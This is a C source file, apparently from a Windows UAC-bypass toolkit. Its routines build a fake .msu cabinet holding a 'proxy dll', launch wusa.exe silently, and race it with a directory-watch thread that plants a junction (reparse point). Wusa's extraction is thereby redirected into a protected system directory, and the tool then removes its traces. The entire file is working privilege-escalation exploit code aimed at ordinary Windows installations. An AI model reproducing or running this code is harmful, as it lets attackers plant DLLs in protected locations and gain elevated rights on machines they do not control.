/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2017 - 2020
*
*  TITLE:       WUSA.C
*
*  VERSION:     3.24
*
*  DATE:        20 Apr 2020
*
*  Windows Update Standalone Installer (WUSA) based routines.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#include "global.h"
#include "makecab.h"

/*
* ucmCreateCabinetForSingleFile
*
* Purpose:
*
* Build cabinet for usage in methods where required 1 file.
*
*/
BOOL ucmCreateCabinetForSingleFile(
    _In_ LPWSTR lpSourceDll,
    _In_ PVOID ProxyDll,
    _In_ DWORD ProxyDllSize,
    _In_opt_ LPWSTR lpInternalName
)
{
    BOOL     bResult = FALSE;
    CABDATA *Cabinet = NULL;
    LPWSTR   lpFileName;
    WCHAR    szMsuFileName[MAX_PATH * 2];

    if ((ProxyDll == NULL) ||
        (ProxyDllSize == 0) ||
        (lpSourceDll == NULL)) return bResult;

    do {

        //drop proxy dll
        if (!supWriteBufferToFile(lpSourceDll, ProxyDll, ProxyDllSize)) {
            break;
        }

        //build cabinet
        RtlSecureZeroMemory(szMsuFileName, sizeof(szMsuFileName));
        _strcpy(szMsuFileName, g_ctx->szTempDirectory);
        _strcat(szMsuFileName, ELLOCNAK_MSU);

        Cabinet = cabCreate(szMsuFileName);
        if (Cabinet == NULL)
            break;

        if (lpInternalName == NULL) {
            lpFileName = _filename(lpSourceDll);
        }
        else {
            lpFileName = lpInternalName;
        }

        //put file without compression
        bResult = cabAddFile(Cabinet, lpSourceDll, lpFileName);
        cabClose(Cabinet);       

    } while (FALSE);

    DeleteFile(lpSourceDll);

    return bResult;
}

/*
* ucmWusaCabinetCleanup
*
* Purpose:
*
* Remove fake msu file.
*
*/
VOID ucmWusaCabinetCleanup(
    VOID)
{
    WCHAR    szMsuFileName[MAX_PATH * 2];

    RtlSecureZeroMemory(szMsuFileName, sizeof(szMsuFileName));
    _strcpy(szMsuFileName, g_ctx->szTempDirectory);
    _strcat(szMsuFileName, ELLOCNAK_MSU);
    DeleteFile(szMsuFileName);
}

volatile ULONG g_ThreadFinished = 0;

/*
* ucmxInvokeWusaThread
*
* Purpose:
*
* Start wusa and wait a bit.
*
*/
DWORD ucmxInvokeWusaThread(
    PVOID Param)
{
    SHELLEXECUTEINFO shinfo;
    WCHAR szProcess[MAX_PATH * 2];
    WCHAR szParameters[MAX_PATH * 3];

    UNREFERENCED_PARAMETER(Param);

    InterlockedExchange((LONG*)&g_ThreadFinished, 0);

    RtlSecureZeroMemory(&shinfo, sizeof(shinfo));

    _strcpy(szProcess, g_ctx->szSystemDirectory);
    _strcat(szProcess, WUSA_EXE);

    RtlSecureZeroMemory(szParameters, sizeof(szParameters));
    _strcpy(szParameters, TEXT(" /quiet "));
    _strcat(szParameters, g_ctx->szTempDirectory);
    _strcat(szParameters, ELLOCNAK_MSU);

    shinfo.cbSize = sizeof(shinfo);
    shinfo.fMask = SEE_MASK_NOCLOSEPROCESS | SEE_MASK_FLAG_NO_UI;
    shinfo.lpFile = szProcess;
    shinfo.lpParameters = szParameters;
    shinfo.nShow = SW_HIDE;

    if (ShellExecuteEx(&shinfo)) {

        if (WaitForSingleObject(shinfo.hProcess, 1000) == WAIT_TIMEOUT)
            TerminateProcess(shinfo.hProcess, 0);

        CloseHandle(shinfo.hProcess);
    }
    Sleep(2000);
    InterlockedExchange((LONG*)&g_ThreadFinished, 1);
    return 0;
}

/*
* ucmxDirectoryWatchdogThread
*
* Purpose:
*
* Monitor directory creation in system root directory.
* When it happened - set reparse point.
*
*/
DWORD ucmxDirectoryWatchdogThread(
    PVOID Param)
{
    BOOL                        bResult = FALSE;
    NTSTATUS                    status;

    HANDLE                      hDirectory = NULL, hReparseDirectory = NULL, hEvent = NULL;
    IO_STATUS_BLOCK             IoStatusBlock;
    OBJECT_ATTRIBUTES           ObjectAttributes;

    LPWSTR                      lpTargetDirectory = (LPWSTR)Param;

    PVOID                       Buffer = NULL;
    SIZE_T                      memIO = 0;
    FILE_NOTIFY_INFORMATION    *pInfo = NULL;

    LPWSTR                      CapturedDirectoryName = NULL, lpEnd = NULL;

    WCHAR szBuffer[MAX_PATH + 1];

    UNICODE_STRING usTargetDirectory, usWatchDirectory, usReparseDirectory;


    do {

        //
        // Convert target directory path to native form.
        //
        usTargetDirectory.Buffer = NULL;
        if (!RtlDosPathNameToNtPathName_U(lpTargetDirectory, &usTargetDirectory, NULL, NULL))
            break;

        //
        // Convert watch directory path to native form.
        //
        RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
        szBuffer[0] = L'\\';
        szBuffer[1] = L'?';
        szBuffer[2] = L'?';
        szBuffer[3] = L'\\';
        _strncpy(&szBuffer[4], MAX_PATH, g_ctx->szSystemDirectory, 3);

        //
        // Open directory for change notification.
        //
        RtlInitUnicodeString(&usWatchDirectory, szBuffer);
        InitializeObjectAttributes(&ObjectAttributes, &usWatchDirectory, OBJ_CASE_INSENSITIVE, 0, NULL);

        status = NtCreateFile(&hDirectory,
            FILE_LIST_DIRECTORY | SYNCHRONIZE,
            &ObjectAttributes,
            &IoStatusBlock,
            NULL,
            FILE_OPEN_FOR_BACKUP_INTENT,
            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
            FILE_OPEN,
            FILE_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
            NULL,
            0);

        if (!NT_SUCCESS(status))
            break;

        memIO = 1024 * 1024;
        Buffer = supHeapAlloc(memIO);
        if (Buffer == NULL)
            break;

        InitializeObjectAttributes(&ObjectAttributes, NULL, 0, 0, NULL);
        status = NtCreateEvent(&hEvent, EVENT_ALL_ACCESS, &ObjectAttributes, NotificationEvent, FALSE);
        if (!NT_SUCCESS(status))
            break;

        //
        // Watch for directory changes.
        //
        do {

            status = NtNotifyChangeDirectoryFile(hDirectory, hEvent, NULL, NULL,
                &IoStatusBlock, Buffer, (ULONG)memIO, FILE_NOTIFY_CHANGE_DIR_NAME, TRUE);

            if (status == STATUS_PENDING)
                NtWaitForSingleObject(hEvent, TRUE, NULL);

            NtSetEvent(hEvent, NULL);

            pInfo = (FILE_NOTIFY_INFORMATION*)Buffer;
            for (;;) {

                if (pInfo->Action == FILE_ACTION_ADDED) {

                    memIO = pInfo->FileNameLength +
                        ((1 + _strlen(szBuffer)) * sizeof(WCHAR));

                    CapturedDirectoryName = (LPWSTR)supHeapAlloc(memIO);

                    if (CapturedDirectoryName) {
                        _strcpy(CapturedDirectoryName, szBuffer);
                        lpEnd = _strend(CapturedDirectoryName);
                        RtlCopyMemory(lpEnd, pInfo->FileName, pInfo->FileNameLength);

                        //
                        // Open new directory to set reparse point.
                        //
                        RtlInitUnicodeString(&usReparseDirectory, CapturedDirectoryName);
                        InitializeObjectAttributes(&ObjectAttributes, &usReparseDirectory, OBJ_CASE_INSENSITIVE, NULL, NULL);
                        status = NtCreateFile(&hReparseDirectory, 
                            FILE_ALL_ACCESS,
                            &ObjectAttributes,
                            &IoStatusBlock,
                            NULL,
                            0,
                            FILE_SHARE_READ | FILE_SHARE_WRITE,
                            FILE_OPEN,
                            FILE_OPEN_REPARSE_POINT | FILE_SYNCHRONOUS_IO_NONALERT,
                            NULL,
                            0);

                        if (NT_SUCCESS(status)) {

                            //
                            // Set reparse point.
                            //
                            bResult = supSetMountPoint(hReparseDirectory,
                                usTargetDirectory.Buffer,
                                lpTargetDirectory);

                        }

                        status = STATUS_NO_SECRETS;
                    }

                } //Action

                if (status == STATUS_NO_SECRETS)
                    break;

                pInfo = (FILE_NOTIFY_INFORMATION*)(((LPBYTE)pInfo) + pInfo->NextEntryOffset);
                if (pInfo->NextEntryOffset == 0)
                    break;
            }

        } while (NT_SUCCESS(status));

    } while (FALSE);

    //
    // Cleanup.
    //
    if (hEvent)
        NtClose(hEvent);

    if (hDirectory != NULL)
        NtClose(hDirectory);

    if (usTargetDirectory.Buffer)
        RtlFreeUnicodeString(&usTargetDirectory);

    if (Buffer != NULL)
        supHeapFree(Buffer);

    //
    // Remove reparse point.
    //
    if (CapturedDirectoryName) {

        while (g_ThreadFinished != 1)
            Sleep(100);

        if (hReparseDirectory) {
            supDeleteMountPoint(hReparseDirectory);
            NtClose(hReparseDirectory);
        }

        RtlInitUnicodeString(&usReparseDirectory, CapturedDirectoryName);
        InitializeObjectAttributes(&ObjectAttributes, &usReparseDirectory, OBJ_CASE_INSENSITIVE, NULL, NULL);
        NtDeleteFile(&ObjectAttributes);
        supHeapFree(CapturedDirectoryName);
    }

    return (DWORD)bResult;
}

/*
* ucmWusaExtractViaJunction
*
* Purpose:
*
* Extract cab contents to the specified directory by initializing wusa race condition.
* This routine expect source as ellocnak.msu cab file in the %temp% folder.
*
*/
BOOL ucmWusaExtractViaJunction(
    _In_ LPWSTR lpTargetDirectory
)
{
    HANDLE hWatchdogThread, hWusaThread;
    DWORD ti;

    do {

        //
        // Run watchdog thread.
        //
        hWatchdogThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ucmxDirectoryWatchdogThread, lpTargetDirectory, 0, &ti);
        if (hWatchdogThread == NULL)
            break;

        //
        // Run wusa in separate thread.
        //
        hWusaThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ucmxInvokeWusaThread, NULL, 0, &ti);
        if (hWusaThread) {
            if (WaitForSingleObject(hWusaThread, 15000) == WAIT_TIMEOUT)
                TerminateThread(hWusaThread, 0);

            CloseHandle(hWusaThread);
        }

        if (WaitForSingleObject(hWatchdogThread, 10000) == WAIT_TIMEOUT)
            TerminateThread(hWatchdogThread, 0);

        CloseHandle(hWatchdogThread);

    } while (FALSE);

    return (g_ThreadFinished == 1);
}
